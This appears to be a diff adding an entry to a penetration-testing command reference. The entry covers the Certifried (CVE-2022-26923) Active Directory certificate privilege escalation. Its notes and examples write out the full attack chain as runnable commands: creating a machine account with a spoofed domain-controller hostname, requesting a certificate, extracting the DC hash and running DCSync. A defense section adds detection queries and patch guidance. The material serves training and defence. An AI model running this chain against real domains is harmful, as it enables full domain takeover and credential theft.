@@ -1,0 +1,103 @@
+{
+  "id": "ad-certifried",
+  "name": "Certifried (CVE-2022-26923) - Machine Account Certificate Privilege Escalation",
+  "command": "certipy account create -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -dns <dc_hostname> -user <new_machine>",
+  "description": "Certifried exploits CVE-2022-26923 where a low-privileged user creates a machine account, sets its dNSHostName to match a Domain Controller, then requests a certificate. The CA issues a cert for the DC identity, enabling DCSync. Patches in May 2022 added szOID_NTDS_CA_SECURITY_EXT to certificates.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CVE-2022-26923; Oliver Lyak research",
+  "tags": [
+    "certifried",
+    "cve-2022-26923",
+    "adcs",
+    "machine-account",
+    "dnshostname",
+    "certificate",
+    "dcsync"
+  ],
+  "mitre": [
+    "T1649",
+    "T1003.006"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== PREREQUISITES ===\n- MachineAccountQuota > 0 (default: 10)\n- ADCS with a template allowing machine enrollment (default: Machine template)\n- Unpatched DCs (pre-May 2022 KB5014754)\n\n=== ATTACK CHAIN ===\n  # Step 1: Create machine account with DC dNSHostName\n  certipy account create -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -dns <dc_hostname> -user EVIL$\n\n  # Step 2: Request certificate as the spoofed DC\n  certipy req -u EVIL$@<domain> -p <pass> -ca <ca_name> -template Machine -dc-ip <dc_ip>\n\n  # Step 3: Authenticate with the DC certificate\n  certipy auth -pfx dc01.pfx -dc-ip <dc_ip>\n\n  # Step 4: DCSync with the DC NT hash\n  secretsdump.py -hashes :<dc_hash> <domain>/DC01$@<dc_ip>\n\n=== ALTERNATIVE: impacket addcomputer ===\n  addcomputer.py -computer-name EVIL$ -computer-pass Password123 <domain>/<user>:<pass>\n  # Then modify dNSHostName with ldap tools\n\n=== DETECTION EVASION ===\n- The attack modifies dNSHostName which is logged\n- Machine account creation is logged in Event 4741\n- Certificate requests are logged in Event 4886/4887",
+  "examples": [
+    {
+      "label": "Create machine with spoofed DNS",
+      "command": "certipy account create -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -dns DC01.corp.local -user EVIL$"
+    },
+    {
+      "label": "Request certificate as DC",
+      "command": "certipy req -u EVIL$@corp.local -p Password123 -ca corp-CA -template Machine -dc-ip 192.168.1.10"
+    },
+    {
+      "label": "Auth and get DC hash",
+      "command": "certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "CVE-2022-26923 - Certifried",
+      "url": "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"
+    },
+    {
+      "title": "Certipy",
+      "url": "https://github.com/ly4k/Certipy"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-addcomputer",
+      "note": "Machine account creation is the first step of Certifried.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "Different ADCS attack vector (SAN abuse vs machine impersonation).",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "When a machine account requests a certificate, the CA uses the dNSHostName to identify it. By setting a new machine dNSHostName to match a DC, the CA issues a certificate for the DC identity.",
+    "prerequisites": "MachineAccountQuota > 0; ADCS with machine enrollment template; unpatched DC.",
+    "impact": "Full domain compromise via DCSync with DC machine account certificate.",
+    "detection": "[MITRE T1649] Machine account creation (4741) followed by dNSHostName change (5136) and certificate request (4886).",
+    "artifacts": "Event 4741 (machine account created); Event 5136 (dNSHostName modified); Event 4886/4887 (cert request/issued).",
+    "splunk_spl": "index=windows (EventCode=4741 OR (EventCode=5136 AND AttributeLDAPDisplayName=\"dNSHostName\"))\n| transaction SubjectUserName maxspan=10m\n| where eventcount > 1\n| table _time, SubjectUserName, TargetUserName, AttributeValue",
+    "elastic_kql": "(event.code:\"4741\") OR (event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"dNSHostName\")",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (4741, 5136)\n| where EventID == 5136 and AttributeLDAPDisplayName == \"dNSHostName\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue",
+    "sigma_rules": "win_security_certifried_cve_2022_26923",
+    "prevention": "Apply KB5014754 (May 2022 patches); set MachineAccountQuota to 0; monitor dNSHostName changes; enable szOID_NTDS_CA_SECURITY_EXT.",
+    "sources": [
+      "CVE-2022-26923",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Certifried - Machine account DNS spoofing",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"dNSHostName\"\n| where ObjectDN contains \"CN=Computers\" or ObjectDN contains \"OU=\"\n| where AttributeValue has_any (\"DC\", \"dc\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1649",
+          "T1003.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate DNS name changes on computer accounts (very rare)",
+        "tuning": "Any dNSHostName change to a DC hostname is extremely suspicious"
+      }
+    ]
+  }
+}
